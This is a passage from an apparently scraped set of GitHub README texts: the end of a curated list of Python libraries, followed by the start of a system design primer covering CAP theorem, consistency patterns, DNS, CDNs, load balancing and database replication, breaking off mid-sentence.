- Fastest and full featured pure Python parsers of Markdown.\nPython-Markdown - A Python implementation of John Gruber\u2019s Markdown.\n\n\nYAML\n\nPyYAML - YAML implementations for Python.\n\n\nCSV\n\ncsvkit - Utilities for converting to and working with CSV.\n\n\nArchive\n\nunp - A command line tool that can unpack archives easily.\n\n\n\nStatic Site Generator\nStatic site generator is a software that takes some text + templates as input and produces HTML files on the output.\n\nmkdocs - Markdown friendly documentation generator.\npelican - Static site generator that supports Markdown and reST syntax.\nlektor - An easy to use static CMS and blog engine.\nnikola - A static website and blog generator.\n\nTagging\nLibraries for tagging items.\n\ndjango-taggit - Simple tagging for Django.\n\nTemplate Engine\nLibraries and tools for templating and lexing.\n\nJinja2 - A modern and designer friendly templating language.\nGenshi - Python templating toolkit for generation of web-aware output.\nMako - Hyperfast and lightweight templating for the Python platform.\n\nTesting\nLibraries for testing codebases and generating test data.\n\nTesting Frameworks\n\npytest - A mature full-featured Python testing tool.\nhypothesis - Hypothesis is an advanced Quickcheck style property based testing library.\nnose2 - The successor to nose, based on `unittest2.\nRobot Framework - A generic test automation framework.\nunittest - (Python standard library) Unit testing framework.\n\n\nTest Runners\n\ngreen - A clean, colorful test runner.\nmamba - The definitive testing tool for Python. Born under the banner of BDD.\ntox - Auto builds and tests distributions in multiple Python versions\n\n\nGUI / Web Testing\n\nlocust - Scalable user load testing tool written in Python.\nPyAutoGUI - PyAutoGUI is a cross-platform GUI automation Python module for human beings.\nSelenium - Python bindings for Selenium WebDriver.\nsixpack - A language-agnostic A/B Testing framework.\nsplinter - Open source tool for testing web applications.\n\n\nMock\n\ndoublex - Powerful test doubles framework for Python.\nfreezegun - Travel through time by mocking the datetime module.\nhttmock - A mocking library for requests for Python 2.6+ and 3.2+.\nhttpretty - HTTP request mock tool for Python.\nmock - (Python standard library) A mocking and patching library.\nMocket - Socket Mock Framework plus HTTP[S]/asyncio/gevent mocking library with recording/replaying capability.\nresponses - A utility library for mocking out the requests Python library.\nVCR.py - Record and replay HTTP interactions on your tests.\n\n\nObject Factories\n\nfactory_boy - A test fixtures replacement for Python.\nmixer - Another fixtures replacement. Supported Django, Flask, SQLAlchemy, Peewee and etc.\nmodel_mommy - Creating random fixtures for testing in Django.\n\n\nCode Coverage\n\ncoverage - Code coverage measurement.\n\n\nFake Data\n\nmimesis - is a Python library that help you generate fake data.\nfake2db - Fake database generator.\nfaker - A Python package that generates fake data.\nradar - Generate random datetime / time.\n\n\nError Handler\n\nFuckIt.py - FuckIt.py uses state-of-the-art technology to make sure your Python code runs whether it has any right to or not.\n\n\n\nText Processing\nLibraries for parsing and manipulating plain texts.\n\nGeneral\n\nchardet - Python 2/3 compatible character encoding detector.\ndifflib - (Python standard library) Helpers for computing deltas.\nftfy - Makes Unicode text less broken and more consistent automagically.\nfuzzywuzzy - Fuzzy String Matching.\nLevenshtein - Fast computation of Levenshtein distance and string similarity.\npangu.py - Paranoid text spacing.\npyfiglet - An implementation of figlet written in Python.\npypinyin - Convert Chinese hanzi (\u6f22\u5b57) to pinyin (\u62fc\u97f3).\ntextdistance - Compute distance between sequences. 30+ algorithms, pure python implementation, common interface, optional external libs usage.\nunidecode - ASCII transliterations of Unicode text.\n\n\nSlugify\n\nawesome-slugify - A Python slugify library that can preserve unicode.\npython-slugify - A Python slugify library that translates unicode to ASCII.\nunicode-slugify - A slugifier that generates unicode slugs with Django as a dependency.\n\n\nUnique identifiers\n\nhashids - Implementation of hashids in Python.\nshortuuid - A generator library for concise, unambiguous and URL-safe UUIDs.\n\n\nParser\n\nply - Implementation of lex and yacc parsing tools for Python.\npygments - A generic syntax highlighter.\npyparsing - A general purpose framework for generating parsers.\npython-nameparser - Parsing human names into their individual components.\npython-phonenumbers - Parsing, formatting, storing and validating international phone numbers.\npython-user-agents - Browser user agent parser.\nsqlparse - A non-validating SQL parser.\n\n\n\nThird-party APIs\nLibraries for accessing third party services APIs. See: List of Python API Wrappers and Libraries.\n\napache-libcloud - One Python library for all clouds.\nboto3 - Python interface to Amazon Web Services.\ndjango-wordpress - WordPress models and views for Django.\nfacebook-sdk - Facebook Platform Python SDK.\ngoogle-api-python-client - Google APIs Client Library for Python.\ngspread - Google Spreadsheets Python API.\ntwython - A Python wrapper for the Twitter API.\n\nURL Manipulation\nLibraries for parsing URLs.\n\nfurl - A small Python library that makes parsing and manipulating URLs easy.\npurl - A simple, immutable URL class with a clean API for interrogation and manipulation.\npyshorteners - A pure Python URL shortening lib.\nwebargs - A friendly library for parsing HTTP request arguments, with built-in support for popular web frameworks, including Flask, Django, Bottle, Tornado, and Pyramid.\n\nVideo\nLibraries for manipulating video and GIFs.\n\nmoviepy - A module for script-based movie editing with many formats, including animated GIFs.\nscikit-video - Video processing routines for SciPy.\n\nWSGI Servers\nWSGI-compatible web servers.\n\nbjoern - Asynchronous, very fast and written in C.\ngunicorn - Pre-forked, partly written in C.\nuWSGI - A project aims at developing a full stack for building hosting services, written in C.\nwaitress - Multi-threaded, powers Pyramid.\nwerkzeug - A WSGI utility library for Python that powers Flask and can easily be embedded into your own projects.\n\nWeb Asset Management\nTools for managing, compressing and minifying website assets.\n\ndjango-compressor - Compresses linked and inline JavaScript or CSS into a single cached file.\ndjango-pipeline - An asset packaging library for Django.\ndjango-storages - A collection of custom storage back ends for Django.\nfanstatic - Packages, optimizes, and serves static file dependencies as Python packages.\nfileconveyor - A daemon to detect and sync files to CDNs, S3 and FTP.\nflask-assets - Helps you integrate webassets into your Flask app.\nwebassets - Bundles, optimizes, and manages unique cache-busting URLs for static resources.\n\nWeb Content Extracting\nLibraries for extracting web contents.\n\nhtml2text - Convert HTML to Markdown-formatted text.\nlassie - Web Content Retrieval for Humans.\nmicawber - A small library for extracting rich content from URLs.\nnewspaper - News extraction, article extraction and content curation in Python.\npython-readability - Fast Python port of arc90's readability tool.\nrequests-html - Pythonic HTML Parsing for Humans.\nsumy - A module for automatic summarization of text documents and HTML pages.\ntextract - Extract text from any document, Word, PowerPoint, PDFs, etc.\ntoapi - Every web site provides APIs.\n\nWeb Crawling & Web Scraping\nLibraries to automate data extraction from websites.\n\ncola - A distributed crawling framework.\nfeedparser - Universal feed parser.\ngrab - Site scraping framework.\nMechanicalSoup - A Python library for automating interaction with websites.\nportia - Visual scraping for Scrapy.\npyspider - A powerful spider system.\nrobobrowser - A simple, Pythonic library for browsing the web without a standalone web browser.\nscrapy - A fast high-level screen scraping and web crawling framework.\n\nWeb Frameworks\nFull stack web frameworks.\n\nDjango - The most popular web framework in Python.\n\nawesome-django\n\n\nFlask - A microframework for Python.\n\nawesome-flask\n\n\nPyramid - A small, fast, down-to-earth, open source Python web framework.\n\nawesome-pyramid\n\n\nSanic - Web server that's written to go fast.\nVibora - Fast, efficient and asynchronous Web framework inspired by Flask.\nTornado - A Web framework and asynchronous networking library.\n\nWebSocket\nLibraries for working with WebSocket.\n\nautobahn-python - WebSocket & WAMP for Python on Twisted and asyncio.\ncrossbar - Open-source Unified Application Router (Websocket & WAMP for Python on Autobahn).\ndjango-channels - Developer-friendly asynchrony for Django.\ndjango-socketio - WebSockets for Django.\nWebSocket-for-Python - WebSocket client and server library for Python 2 and 3 as well as PyPy.\n\nServices\nOnline tools and APIs to simplify development.\nContinuous Integration\nSee: awesome-CIandCD.\n\nCircleCI - A CI service that can run very fast parallel testing. (GitHub only)\nTravis CI - A popular CI service for your open source and private projects. (GitHub only)\nVexor CI - A continuous integration tool for private apps with pay-per-minute billing model.\nWercker - A Docker-based platform for building and deploying applications and microservices.\n\nCode Quality\n\nCodacy - Automated Code Review to ship better code, faster.\nCodecov - Code coverage dashboard.\nCodeFactor - Automated Code Review for Git.\nLandscape - Hosted continuous Python code metrics.\n\nResources\nWhere to discover new Python libraries.\nPodcasts\n\nFrom Python Import Podcast\nPodcast.init\nPython Bytes\nPython Testing\nRadio Free Python\nTalk Python To Me\n\nTwitter\n\n@codetengu\n@getpy\n@importpython\n@planetpython\n@pycoders\n@pypi\n@pythontrending\n@PythonWeekly\n@TalkPython\n@realpython\n\nWebsites\n\n/r/CoolGithubProjects\n/r/Python\nAwesome Python @LibHunt\nDjango Packages\nFull Stack Python\nPyPI Ranking\nPython 3 Wall of Superpowers\nPython Hackers\nPython ZEEF\nPython \u5f00\u53d1\u793e\u533a\nReal Python\nTrending Python repositories on GitHub today\n\nWeekly\n\nCodeTengu Weekly \u78bc\u5929\u72d7\u9031\u520a\nImport Python Newsletter\nPycoder's Weekly\nPython Weekly\nPython Tricks\n\nContributing\nYour contributions are always welcome! Please take a look at the contribution guidelines first.\nI will keep some pull requests open if I'm not sure whether those libraries are awesome, you could vote for them by adding \ud83d\udc4d to them. Pull requests will be merged when their votes reach 20.\n\nIf you have any question about this opinionated list, do not hesitate to contact me @vinta on Twitter or open an issue on GitHub."}, {"title": "donnemartin/system-design-primer", "language": "Python", "content": "English \u2219 \u65e5\u672c\u8a9e \u2219 \u7b80\u4f53\u4e2d\u6587 \u2219 \u7e41\u9ad4\u4e2d\u6587 | Arabic \u2219 Bengali \u2219 Brazilian Portuguese \u2219 German \u2219 Greek \u2219 Italian \u2219 Korean \u2219 Persian \u2219 Polish \u2219 Russian \u2219 Spanish \u2219 Thai \u2219 Turkish \u2219 Vietnamese | Add Translation\nThe System Design Primer\n\n\n\n\nMotivation\n\nLearn how to design large-scale systems.\nPrep for the system design interview.\n\nLearn how to design large-scale systems\nLearning how to design scalable systems will help you become a better engineer.\nSystem design is a broad topic.  There is a vast amount of resources scattered throughout the web on system design principles.\nThis repo is an organized collection of resources to help you learn how to build systems at scale.\nLearn from the open source community\nThis is a continually updated, open source project.\nContributions are welcome!\nPrep for the system design interview\nIn addition to coding interviews, system design is a required component of the technical interview process at many tech companies.\nPractice common system design interview questions and compare your results with sample solutions: discussions, code, and diagrams.\nAdditional topics for interview prep:\n\nStudy guide\nHow to approach a system design interview question\nSystem design interview questions, with solutions\nObject-oriented design interview questions, with solutions\nAdditional system design interview questions\n\nAnki flashcards\n\n\n\n\nThe provided Anki flashcard decks use spaced repetition to help you retain key system design concepts.\n\nSystem design deck\nSystem design exercises deck\nObject oriented design exercises deck\n\nGreat for use while on-the-go.\nCoding Resource: Interactive Coding Challenges\nLooking for resources to help you prep for the Coding Interview?\n\n\n\n\nCheck out the sister repo Interactive Coding Challenges, which contains an additional Anki deck:\n\nCoding deck\n\nContributing\n\nLearn from the community.\n\nFeel free to submit pull requests to help:\n\nFix errors\nImprove sections\nAdd new sections\nTranslate\n\nContent that needs some polishing is placed under development.\nReview the Contributing Guidelines.\nIndex of system design topics\n\nSummaries of various system design topics, including pros and cons.  Everything is a trade-off.\nEach section contains links to more in-depth resources.\n\n\n\n\n\n\nSystem design topics: start here\n\nStep 1: Review the scalability video lecture\nStep 2: Review the scalability article\nNext steps\n\n\nPerformance vs scalability\nLatency vs throughput\nAvailability vs consistency\n\nCAP theorem\n\nCP - consistency and partition tolerance\nAP - availability and partition tolerance\n\n\n\n\nConsistency patterns\n\nWeak consistency\nEventual consistency\nStrong consistency\n\n\nAvailability patterns\n\nFail-over\nReplication\n\n\nDomain name system\nContent delivery network\n\nPush CDNs\nPull CDNs\n\n\nLoad balancer\n\nActive-passive\nActive-active\nLayer 4 load balancing\nLayer 7 load balancing\nHorizontal scaling\n\n\nReverse proxy (web server)\n\nLoad balancer vs reverse proxy\n\n\nApplication layer\n\nMicroservices\nService discovery\n\n\nDatabase\n\nRelational database management system (RDBMS)\n\nMaster-slave replication\nMaster-master replication\nFederation\nSharding\nDenormalization\nSQL tuning\n\n\nNoSQL\n\nKey-value store\nDocument store\nWide column store\nGraph Database\n\n\nSQL or NoSQL\n\n\nCache\n\nClient caching\nCDN caching\nWeb server caching\nDatabase caching\nApplication caching\nCaching at the database query level\nCaching at the object level\nWhen to update the cache\n\nCache-aside\nWrite-through\nWrite-behind (write-back)\nRefresh-ahead\n\n\n\n\nAsynchronism\n\nMessage queues\nTask queues\nBack pressure\n\n\nCommunication\n\nTransmission control protocol (TCP)\nUser datagram protocol (UDP)\nRemote procedure call (RPC)\nRepresentational state transfer (REST)\n\n\nSecurity\nAppendix\n\nPowers of two table\nLatency numbers every programmer should know\nAdditional system design interview questions\nReal world architectures\nCompany architectures\nCompany engineering blogs\n\n\nUnder development\nCredits\nContact info\nLicense\n\nStudy guide\n\nSuggested topics to review based on your interview timeline (short, medium, long).\n\n\nQ: For interviews, do I need to know everything here?\nA: No, you don't need to know everything here to prepare for the interview.\nWhat you are asked in an interview depends on variables such as:\n\nHow much experience you have\nWhat your technical background is\nWhat positions you are interviewing for\nWhich companies you are interviewing with\nLuck\n\nMore experienced candidates are generally expected to know more about system design.  Architects or team leads might be expected to know more than individual contributors.  Top tech companies are likely to have one or more design interview rounds.\nStart broad and go deeper in a few areas.  It helps to know a little about various key system design topics.  Adjust the following guide based on your timeline, experience, what positions you are interviewing for, and which companies you are interviewing with.\n\nShort timeline - Aim for breadth with system design topics.  Practice by solving some interview questions.\nMedium timeline - Aim for breadth and some depth with system design topics.  Practice by solving many interview questions.\nLong timeline - Aim for breadth and more depth with system design topics.  Practice by solving most interview questions.\n\n\n\n\n\nShort\nMedium\nLong\n\n\n\n\nRead through the System design topics to get a broad understanding of how systems work\n\ud83d\udc4d\n\ud83d\udc4d\n\ud83d\udc4d\n\n\nRead through a few articles in the Company engineering blogs for the companies you are interviewing with\n\ud83d\udc4d\n\ud83d\udc4d\n\ud83d\udc4d\n\n\nRead through a few Real world architectures\n\ud83d\udc4d\n\ud83d\udc4d\n\ud83d\udc4d\n\n\nReview How to approach a system design interview question\n\ud83d\udc4d\n\ud83d\udc4d\n\ud83d\udc4d\n\n\nWork through System design interview questions with solutions\nSome\nMany\nMost\n\n\nWork through Object-oriented design interview questions with solutions\nSome\nMany\nMost\n\n\nReview Additional system design interview questions\nSome\nMany\nMost\n\n\n\nHow to approach a system design interview question\n\nHow to tackle a system design interview question.\n\nThe system design interview is an open-ended conversation.  You are expected to lead it.\nYou can use the following steps to guide the discussion.  To help solidify this process, work through the System design interview questions with solutions section using the following steps.\nStep 1: Outline use cases, constraints, and assumptions\nGather requirements and scope the problem.  Ask questions to clarify use cases and constraints.  Discuss assumptions.\n\nWho is going to use it?\nHow are they going to use it?\nHow many users are there?\nWhat does the system do?\nWhat are the inputs and outputs of the system?\nHow much data do we expect to handle?\nHow many requests per second do we expect?\nWhat is the expected read to write ratio?\n\nStep 2: Create a high level design\nOutline a high level design with all important components.\n\nSketch the main components and connections\nJustify your ideas\n\nStep 3: Design core components\nDive into details for each core component.  For example, if you were asked to design a url shortening service, discuss:\n\nGenerating and storing a hash of the full url\n\nMD5 and Base62\nHash collisions\nSQL or NoSQL\nDatabase schema\n\n\nTranslating a hashed url to the full url\n\nDatabase lookup\n\n\nAPI and object-oriented design\n\nStep 4: Scale the design\nIdentify and address bottlenecks, given the constraints.  For example, do you need the following to address scalability issues?\n\nLoad balancer\nHorizontal scaling\nCaching\nDatabase sharding\n\nDiscuss potential solutions and trade-offs.  Everything is a trade-off.  Address bottlenecks using principles of scalable system design.\nBack-of-the-envelope calculations\nYou might be asked to do some estimates by hand.  Refer to the Appendix for the following resources:\n\nUse back of the envelope calculations\nPowers of two table\nLatency numbers every programmer should know\n\nSource(s) and further reading\nCheck out the following links to get a better idea of what to expect:\n\nHow to ace a systems design interview\nThe system design interview\nIntro to Architecture and Systems Design Interviews\n\nSystem design interview questions with solutions\n\nCommon system design interview questions with sample discussions, code, and diagrams.\nSolutions linked to content in the solutions/ folder.\n\n\n\n\nQuestion\n\n\n\n\n\nDesign Pastebin.com (or Bit.ly)\nSolution\n\n\nDesign the Twitter timeline and search (or Facebook feed and search)\nSolution\n\n\nDesign a web crawler\nSolution\n\n\nDesign Mint.com\nSolution\n\n\nDesign the data structures for a social network\nSolution\n\n\nDesign a key-value store for a search engine\nSolution\n\n\nDesign Amazon's sales ranking by category feature\nSolution\n\n\nDesign a system that scales to millions of users on AWS\nSolution\n\n\nAdd a system design question\nContribute\n\n\n\nDesign Pastebin.com (or Bit.ly)\nView exercise and solution\n\nDesign the Twitter timeline and search (or Facebook feed and search)\nView exercise and solution\n\nDesign a web crawler\nView exercise and solution\n\nDesign Mint.com\nView exercise and solution\n\nDesign the data structures for a social network\nView exercise and solution\n\nDesign a key-value store for a search engine\nView exercise and solution\n\nDesign Amazon's sales ranking by category feature\nView exercise and solution\n\nDesign a system that scales to millions of users on AWS\nView exercise and solution\n\nObject-oriented design interview questions with solutions\n\nCommon object-oriented design interview questions with sample discussions, code, and diagrams.\nSolutions linked to content in the solutions/ folder.\n\n\nNote: This section is under development\n\n\n\n\nQuestion\n\n\n\n\n\nDesign a hash map\nSolution\n\n\nDesign a least recently used cache\nSolution\n\n\nDesign a call center\nSolution\n\n\nDesign a deck of cards\nSolution\n\n\nDesign a parking lot\nSolution\n\n\nDesign a chat server\nSolution\n\n\nDesign a circular array\nContribute\n\n\nAdd an object-oriented design question\nContribute\n\n\n\nSystem design topics: start here\nNew to system design?\nFirst, you'll need a basic understanding of common principles, learning about what they are, how they are used, and their pros and cons.\nStep 1: Review the scalability video lecture\nScalability Lecture at Harvard\n\nTopics covered:\n\nVertical scaling\nHorizontal scaling\nCaching\nLoad balancing\nDatabase replication\nDatabase partitioning\n\n\n\nStep 2: Review the scalability article\nScalability\n\nTopics covered:\n\nClones\nDatabases\nCaches\nAsynchronism\n\n\n\nNext steps\nNext, we'll look at high-level trade-offs:\n\nPerformance vs scalability\nLatency vs throughput\nAvailability vs consistency\n\nKeep in mind that everything is a trade-off.\nThen we'll dive into more specific topics such as DNS, CDNs, and load balancers.\nPerformance vs scalability\nA service is scalable if it results in increased performance in a manner proportional to resources added. Generally, increasing performance means serving more units of work, but it can also be to handle larger units of work, such as when datasets grow.1\nAnother way to look at performance vs scalability:\n\nIf you have a performance problem, your system is slow for a single user.\nIf you have a scalability problem, your system is fast for a single user but slow under heavy load.\n\nSource(s) and further reading\n\nA word on scalability\nScalability, availability, stability, patterns\n\nLatency vs throughput\nLatency is the time to perform some action or to produce some result.\nThroughput is the number of such actions or results per unit of time.\nGenerally, you should aim for maximal throughput with acceptable latency.\nSource(s) and further reading\n\nUnderstanding latency vs throughput\n\nAvailability vs consistency\nCAP theorem\n\n\n\nSource: CAP theorem revisited\n\nIn a distributed computer system, you can only support two of the following guarantees:\n\nConsistency - Every read receives the most recent write or an error\nAvailability - Every request receives a response, without guarantee that it contains the most recent version of the information\nPartition Tolerance - The system continues to operate despite arbitrary partitioning due to network failures\n\nNetworks aren't reliable, so you'll need to support partition tolerance.  You'll need to make a software tradeoff between consistency and availability.\nCP - consistency and partition tolerance\nWaiting for a response from the partitioned node might result in a timeout error.  CP is a good choice if your business needs require atomic reads and writes.\nAP - availability and partition tolerance\nResponses return the most recent version of the data available on a node, which might not be the latest.  Writes might take some time to propagate when the partition is resolved.\nAP is a good choice if the business needs allow for eventual consistency or when the system needs to continue working despite external errors.\nSource(s) and further reading\n\nCAP theorem revisited\nA plain english introduction to CAP theorem\nCAP FAQ\n\nConsistency patterns\nWith multiple copies of the same data, we are faced with options on how to synchronize them so clients have a consistent view of the data.  Recall the definition of consistency from the CAP theorem - Every read receives the most recent write or an error.\nWeak consistency\nAfter a write, reads may or may not see it.  A best effort approach is taken.\nThis approach is seen in systems such as memcached.  Weak consistency works well in real time use cases such as VoIP, video chat, and realtime multiplayer games.  For example, if you are on a phone call and lose reception for a few seconds, when you regain connection you do not hear what was spoken during connection loss.\nEventual consistency\nAfter a write, reads will eventually see it (typically within milliseconds).  Data is replicated asynchronously.\nThis approach is seen in systems such as DNS and email.  Eventual consistency works well in highly available systems.\nStrong consistency\nAfter a write, reads will see it.  Data is replicated synchronously.\nThis approach is seen in file systems and RDBMSes.  Strong consistency works well in systems that need transactions.\nSource(s) and further reading\n\nTransactions across data centers\n\nAvailability patterns\nThere are two main patterns to support high availability: fail-over and replication.\nFail-over\nActive-passive\nWith active-passive fail-over, heartbeats are sent between the active and the passive server on standby.  If the heartbeat is interrupted, the passive server takes over the active's IP address and resumes service.\nThe length of downtime is determined by whether the passive server is already running in 'hot' standby or whether it needs to start up from 'cold' standby.  Only the active server handles traffic.\nActive-passive failover can also be referred to as master-slave failover.\nActive-active\nIn active-active, both servers are managing traffic, spreading the load between them.\nIf the servers are public-facing, the DNS would need to know about the public IPs of both servers.  If the servers are internal-facing, application logic would need to know about both servers.\nActive-active failover can also be referred to as master-master failover.\nDisadvantage(s): failover\n\nFail-over adds more hardware and additional complexity.\nThere is a potential for loss of data if the active system fails before any newly written data can be replicated to the passive.\n\nReplication\nMaster-slave and master-master\nThis topic is further discussed in the Database section:\n\nMaster-slave replication\nMaster-master replication\n\nDomain name system\n\n\n\nSource: DNS security presentation\n\nA Domain Name System (DNS) translates a domain name such as www.example.com to an IP address.\nDNS is hierarchical, with a few authoritative servers at the top level.  Your router or ISP provides information about which DNS server(s) to contact when doing a lookup.  Lower level DNS servers cache mappings, which could become stale due to DNS propagation delays.  DNS results can also be cached by your browser or OS for a certain period of time, determined by the time to live (TTL).\n\nNS record (name server) - Specifies the DNS servers for your domain/subdomain.\nMX record (mail exchange) - Specifies the mail servers for accepting messages.\nA record (address) - Points a name to an IP address.\nCNAME (canonical) - Points a name to another name or CNAME (example.com to www.example.com) or to an A record.\n\nServices such as CloudFlare and Route 53 provide managed DNS services.  Some DNS services can route traffic through various methods:\n\nWeighted round robin\n\nPrevent traffic from going to servers under maintenance\nBalance between varying cluster sizes\nA/B testing\n\n\nLatency-based\nGeolocation-based\n\nDisadvantage(s): DNS\n\nAccessing a DNS server introduces a slight delay, although mitigated by caching described above.\nDNS server management could be complex and is generally managed by governments, ISPs, and large companies.\nDNS services have recently come under DDoS attack, preventing users from accessing websites such as Twitter without knowing Twitter's IP address(es).\n\nSource(s) and further reading\n\nDNS architecture\nWikipedia\nDNS articles\n\nContent delivery network\n\n\n\nSource: Why use a CDN\n\nA content delivery network (CDN) is a globally distributed network of proxy servers, serving content from locations closer to the user.  Generally, static files such as HTML/CSS/JS, photos, and videos are served from CDN, although some CDNs such as Amazon's CloudFront support dynamic content.  The site's DNS resolution will tell clients which server to contact.\nServing content from CDNs can significantly improve performance in two ways:\n\nUsers receive content at data centers close to them\nYour servers do not have to serve requests that the CDN fulfills\n\nPush CDNs\nPush CDNs receive new content whenever changes occur on your server.  You take full responsibility for providing content, uploading directly to the CDN and rewriting URLs to point to the CDN.  You can configure when content expires and when it is updated.  Content is uploaded only when it is new or changed, minimizing traffic, but maximizing storage.\nSites with a small amount of traffic or sites with content that isn't often updated work well with push CDNs.  Content is placed on the CDNs once, instead of being re-pulled at regular intervals.\nPull CDNs\nPull CDNs grab new content from your server when the first user requests the content.  You leave the content on your server and rewrite URLs to point to the CDN.  This results in a slower request until the content is cached on the CDN.\nA time-to-live (TTL) determines how long content is cached.  Pull CDNs minimize storage space on the CDN, but can create redundant traffic if files expire and are pulled before they have actually changed.\nSites with heavy traffic work well with pull CDNs, as traffic is spread out more evenly with only recently-requested content remaining on the CDN.\nDisadvantage(s): CDN\n\nCDN costs could be significant depending on traffic, although this should be weighed with additional costs you would incur not using a CDN.\nContent might be stale if it is updated before the TTL expires it.\nCDNs require changing URLs for static content to point to the CDN.\n\nSource(s) and further reading\n\nGlobally distributed content delivery\nThe differences between push and pull CDNs\nWikipedia\n\nLoad balancer\n\n\n\nSource: Scalable system design patterns\n\nLoad balancers distribute incoming client requests to computing resources such as application servers and databases.  In each case, the load balancer returns the response from the computing resource to the appropriate client.  Load balancers are effective at:\n\nPreventing requests from going to unhealthy servers\nPreventing overloading resources\nHelping eliminate single points of failure\n\nLoad balancers can be implemented with hardware (expensive) or with software such as HAProxy.\nAdditional benefits include:\n\nSSL termination - Decrypt incoming requests and encrypt server responses so backend servers do not have to perform these potentially expensive operations\n\nRemoves the need to install X.509 certificates on each server\n\n\nSession persistence - Issue cookies and route a specific client's requests to same instance if the web apps do not keep track of sessions\n\nTo protect against failures, it's common to set up multiple load balancers, either in active-passive or active-active mode.\nLoad balancers can route traffic based on various metrics, including:\n\nRandom\nLeast loaded\nSession/cookies\nRound robin or weighted round robin\nLayer 4\nLayer 7\n\nLayer 4 load balancing\nLayer 4 load balancers look at info at the transport layer to decide how to distribute requests.  Generally, this involves the source, destination IP addresses, and ports in the header, but not the contents of the packet.  Layer 4 load balancers forward network packets to and from the upstream server, performing Network Address Translation (NAT).\nLayer 7 load balancing\nLayer 7 load balancers look at the application layer to decide how to distribute requests.  This can involve contents of the header, message, and cookies.  Layer 7 load balancers terminates network traffic, reads the message, makes a load-balancing decision, then opens a connection to the selected server.  For example, a layer 7 load balancer can direct video traffic to servers that host videos while directing more sensitive user billing traffic to security-hardened servers.\nAt the cost of flexibility, layer 4 load balancing requires less time and computing resources than Layer 7, although the performance impact can be minimal on modern commodity hardware.\nHorizontal scaling\nLoad balancers can also help with horizontal scaling, improving performance and availability.  Scaling out using commodity machines is more cost efficient and results in higher availability than scaling up a single server on more expensive hardware, called Vertical Scaling.  It is also easier to hire for talent working on commodity hardware than it is for specialized enterprise systems.\nDisadvantage(s): horizontal scaling\n\nScaling horizontally introduces complexity and involves cloning servers\n\nServers should be stateless: they should not contain any user-related data like sessions or profile pictures\nSessions can be stored in a centralized data store such as a database (SQL, NoSQL) or a persistent cache (Redis, Memcached)\n\n\nDownstream servers such as caches and databases need to handle more simultaneous connections as upstream servers scale out\n\nDisadvantage(s): load balancer\n\nThe load balancer can become a performance bottleneck if it does not have enough resources or if it is not configured properly.\nIntroducing a load balancer to help eliminate single points of failure results in increased complexity.\nA single load balancer is a single point of failure, configuring multiple load balancers further increases complexity.\n\nSource(s) and further reading\n\nNGINX architecture\nHAProxy architecture guide\nScalability\nWikipedia\nLayer 4 load balancing\nLayer 7 load balancing\nELB listener config\n\nReverse proxy (web server)\n\n\n\nSource: Wikipedia\n\n\nA reverse proxy is a web server that centralizes internal services and provides unified interfaces to the public.  Requests from clients are forwarded to a server that can fulfill it before the reverse proxy returns the server's response to the client.\nAdditional benefits include:\n\nIncreased security - Hide information about backend servers, blacklist IPs, limit number of connections per client\nIncreased scalability and flexibility - Clients only see the reverse proxy's IP, allowing you to scale servers or change their configuration\nSSL termination - Decrypt incoming requests and encrypt server responses so backend servers do not have to perform these potentially expensive operations\n\nRemoves the need to install X.509 certificates on each server\n\n\nCompression - Compress server responses\nCaching - Return the response for cached requests\nStatic content - Serve static content directly\n\nHTML/CSS/JS\nPhotos\nVideos\nEtc\n\n\n\nLoad balancer vs reverse proxy\n\nDeploying a load balancer is useful when you have multiple servers.  Often, load balancers  route traffic to a set of servers serving the same function.\nReverse proxies can be useful even with just one web server or application server, opening up the benefits described in the previous section.\nSolutions such as NGINX and HAProxy can support both layer 7 reverse proxying and load balancing.\n\nDisadvantage(s): reverse proxy\n\nIntroducing a reverse proxy results in increased complexity.\nA single reverse proxy is a single point of failure, configuring multiple reverse proxies (ie a failover) further increases complexity.\n\nSource(s) and further reading\n\nReverse proxy vs load balancer\nNGINX architecture\nHAProxy architecture guide\nWikipedia\n\nApplication layer\n\n\n\nSource: Intro to architecting systems for scale\n\nSeparating out the web layer from the application layer (also known as platform layer) allows you to scale and configure both layers independently.  Adding a new API results in adding application servers without necessarily adding additional web servers.  The single responsibility principle advocates for small and autonomous services that work together.  Small teams with small services can plan more aggressively for rapid growth.\nWorkers in the application layer also help enable asynchronism.\nMicroservices\nRelated to this discussion are microservices, which can be described as a suite of independently deployable, small, modular services.  Each service runs a unique process and communicates through a well-defined, lightweight mechanism to serve a business goal. 1\nPinterest, for example, could have the following microservices: user profile, follower, feed, search, photo upload, etc.\nService Discovery\nSystems such as Consul, Etcd, and Zookeeper can help services find each other by keeping track of registered names, addresses, and ports.  Health checks help verify service integrity and are often done using an HTTP endpoint.  Both Consul and Etcd have a built in key-value store that can be useful for storing config values and other shared data.\nDisadvantage(s): application layer\n\nAdding an application layer with loosely coupled services requires a different approach from an architectural, operations, and process viewpoint (vs a monolithic system).\nMicroservices can add complexity in terms of deployments and operations.\n\nSource(s) and further reading\n\nIntro to architecting systems for scale\nCrack the system design interview\nService oriented architecture\nIntroduction to Zookeeper\nHere's what you need to know about building microservices\n\nDatabase\n\n\n\nSource: Scaling up to your first 10 million users\n\nRelational database management system (RDBMS)\nA relational database like SQL is a collection of data items organized in tables.\nACID is a set of properties of relational database transactions.\n\nAtomicity - Each transaction is all or nothing\nConsistency - Any transaction will bring the database from one valid state to another\nIsolation - Executing transactions concurrently has the same results as if the transactions were executed serially\nDurability - Once a transaction has been committed, it will remain so\n\nThere are many techniques to scale a relational database: master-slave replication, master-master replication, federation, sharding, denormalization, and SQL tuning.\nMaster-slave replication\nThe master serves reads and writes, replicating writes to one or more slaves, which serve only reads.  Slaves can also replicate to additional slaves in a tree-like fashion.  If the master goes offline, the system can continue to operate in read-only mode until a slave is promoted to a master or a new master is provisioned.\n\n\n\nSource: Scalability, availability, stability, patterns\n\nDisadvantage(s): master-slave replication\n\nAdditional logic is needed to promote a slave to a master.\nSee Disadvantage(s): replication for points related to both master-slave and master-master.\n\nMaster-master replication\nBoth masters serve reads and writes and coordinate with each other on writes.  If either master goes down, the system can continue to operate with both reads and writes.\n\n\n\nSource: Scalability, availability, stability, patterns\n\nDisadvantage(s): master-master replication\n\nYou'll need a load balancer or you'll need to make changes to your application logic to determine where to write.\nMost master-master systems are either loosely consistent (violating ACID) or have increased write latency due to synchronization.\nConflict resolution comes more into play as more write nodes are added and as latency increases.\nSee Disadvantage(s): replication for points related to both master-slave and master-master.\n\nDisadvantage(s): replication\n\nThere is a potential for loss of data if the master fails before any newly written data can be replicated to other nodes.\nWrites are replayed to the read replicas.  If there are a lot of writes, the read replicas can get bogged down with replaying writes and can't do as many 